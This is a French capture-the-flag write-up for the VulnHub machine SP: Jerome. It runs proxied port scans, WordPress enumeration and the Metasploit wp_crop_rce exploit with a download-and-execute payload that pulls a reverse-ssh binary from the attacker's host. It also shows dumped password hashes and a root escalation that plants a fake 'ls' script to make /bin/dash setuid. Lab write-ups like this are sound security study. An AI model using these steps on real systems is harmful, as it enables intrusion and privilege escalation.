# Solution du CTF SP: Jerome de VulnHub

Le CTF [SP: jerome](https://vulnhub.com/entry/sp-jerome-v101,303/) disponible sur VulnHub est le dernier de la série créé par [Daniel Solstad](https://dsolstad.com/) qui me reste à faire.

La difficulté principale est de faire avec la contrainte que l'on croise dès le début du CTF.

```
Nmap scan report for 192.168.56.82
Host is up (0.00012s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy Squid http proxy 3.5.27
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.27
MAC Address: 08:00:27:AE:AB:F5 (Oracle VirtualBox virtual NIC)
```

Il y a seulement un serveur proxy. On peut regarder s'il y a un serveur web derrière :

```shellsession
curl -D- -x http://192.168.56.82:8080/ http://127.0.0.1/
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Sat, 13 Apr 2019 11:19:45 GMT
ETag: "13-5866798be0ba1"
Accept-Ranges: bytes
Content-Length: 19
Content-Type: text/html
Age: 14
X-Cache: HIT from jerome
X-Cache-Lookup: HIT from jerome:8080
Via: 1.1 jerome (squid/3.5.27)
Connection: keep-alive

<!- Move along -->
```

## Proxification

On peut chercher d'autres ports sur l'interface loopback en utilisant le proxy comme relais pour *Nmap*.

Pour cela je configure un *proxychains-ng* :

```ini
[ProxyList]
http 192.168.56.82 8080
```

Et un port supplémentaire apparait :

```shellsession
$ ./proxychains4 -q nmap -p- -sT 127.0.0.1
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
1337/tcp open  waste
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 74.02 seconds
```

Je relance le scan en plus poussé sur les ports qui m'intéressent :

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

C'est le moment pour une énumération web :

```shellsession
$ feroxbuster --proxy http://192.168.56.82:8080/ -u http://127.0.0.1:1337/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://127.0.0.1:1337/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💎  Proxy                 │ http://192.168.56.82:8080/
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      317c http://127.0.0.1:1337/wordpress
301        9l       28w      328c http://127.0.0.1:1337/wordpress/wp-content
301        9l       28w      326c http://127.0.0.1:1337/wordpress/wp-admin
301        9l       28w      329c http://127.0.0.1:1337/wordpress/wp-includes
--- snip ---
```

En configurant mon browser pour utiliser le proxy je parviens à accéder au Wordpress et à me connecter avec les identifiants *jerome* / *jerome* mais l'utilisateur n'est pas administrateur et ne peut donc pas éditer les fichiers php.

On va en savoir sur plus sur Wordpress avec *wpscan* :

```shellsession
$  docker run -it --rm wpscanteam/wpscan --proxy http://192.168.56.82:8080/ --url http://127.0.0.1:1337/wordpress/ -e ap,at,cb,dbe --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://127.0.0.1:1337/wordpress/ [127.0.0.1]

Interesting Finding(s):
--- snip ---

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://127.0.0.1:1337/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://127.0.0.1:1337/wordpress/, Match: 'WordPress 5.0'
```

Cette version est vulnérable à une faille décrite ici concernant le traitement des images : [The detailed analysis of WordPress 5.0 RCE](https://medium.com/@knownsec404team/the-detailed-analysis-of-wordpress-5-0-rce-a171ed719681)

Metasploit dispose d'un module nommé exploit/multi/http/wp_crop_rce :

> This module exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and <= 4.9.8.
> 
> The crop-image function allows a user, with at least author privileges, to resize an image and perform a path traversal by changing the _wp_attached_file reference during the upload.
> 
> The second part of the exploit will include this image in the current theme by changing the _wp_page_template attribute when creating a post.
> 
> This exploit module only works for Unix-based systems currently.

Metasploit a un format particulier pour spécifier les proxies, il faut faire attention :

```
msf6 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting          Required  Description
   ----       ---------------          --------  -----------
   PASSWORD   jerome                   yes       The WordPress password to authenticate with
   Proxies    http:192.168.56.82:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      1337                     yes       The target port (TCP)
   SSL        false                    no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wordpress/              yes       The base path to the wordpress application
   THEME_DIR                           no        The WordPress theme dir name (disable theme auto-detection if provided)
   USERNAME   jerome                   yes       The WordPress username to authenticate with
   VHOST                               no        HTTP server virtual host


Payload options (php/exec):

   Name  Current Setting                    Required  Description
   ----  ---------------                    --------  -----------
   CMD   curl http://192.168.56.79/success  yes       The command string to execute


Exploit target:

   Id  Name
   --  ----
   0   WordPress



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/wp_crop_rce) > run

[*] Authenticating with WordPress using jerome:jerome...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[-] Exploit aborted due to failure: not-found: Can't find base64 decode on target
[*] Exploit completed, but no session was created.
```

Hmmm mon payload n'est pas passé, apparemment la commande base64 est manquante sur le système (?). Testons un autre paylad :

```
Payload options (php/download_exec):

   Name  Current Setting                     Required  Description
   ----  ---------------                     --------  -----------
   URL   http://192.168.56.1/reverse-sshx64  yes       The pre-encoded URL to the executable
```

Cette fois ça passe et mon reverse-ssh écoute bien sur le port par défaut :

```shellsession
$ ssh -p 31337 192.168.56.82
devloop@192.168.56.82's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jerome@jerome:/var/www/html/wordpress$ id
uid=1000(jerome) gid=1000(jerome) groups=1000(jerome),27(sudo)
```

## Point final

A tout hazard je récupère les identifiants de BDD dans la configuration Wordpress puis les hashs :

```
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email             | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | root       | $P$Bgs0wlRRAvgDEhGK3qjutMytTHAt1X0 | root          | root@localhost.local   |          | 2019-04-03 18:04:42 |                     |           0 | root         |
|  4 | jerome     | $P$Bd6wPdlC7yTllqOHsa.TZFlLjVs1Hk1 | jerome        | jerome@localhost.local |          | 2019-04-16 13:58:43 |                     |           0 | jerome       |
+----+------------+------------------------------------+---------------+------------------------+----------+---------------------+---------------------+-------------+--------------+
```

Le mot de passe de root n'est pas retrouvé par JohnTheRipper...

On a déjà accès à notre premier flag :

```shellsession
jerome@jerome:~$ cat flag.txt 
b0ed001c825
```

Je remarque quelque chose dans `/etc/crontab`. Saurez-vous déceler le problème vous même ?

```shellsession
jerome@jerome:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=.:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
@reboot         root    /bin/bash /usr/share/simulate.sh
@reboot         root    dhclient
jerome@jerome:~$ cat /usr/share/simulate.sh
#
# This script simulates human behaviour from the root account
#

while true
do
    cd /home/jerome;
    ls;
    sleep 120;
done
```

Tic toc, tic toc... Oui c'est bien la présence du dossier courant qui est prioritaire dans la variable PATH.

On va exploiter ça en plaçant un script `ls` dans le dossier de l'utilisateur :

```shellsession
jerome@jerome:~$ echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > ls
jerome@jerome:~$ chmod 755 ls
jerome@jerome:~$ sleep 120
jerome@jerome:~$ dash -p
# id
uid=1000(jerome) gid=1000(jerome) euid=0(root) groups=1000(jerome),27(sudo)
# cd /root
# ls
flag.txt
# cat flag.txt
f60532cf8a
```

Mission accomplie !

*Publié le 21 décembre 2022*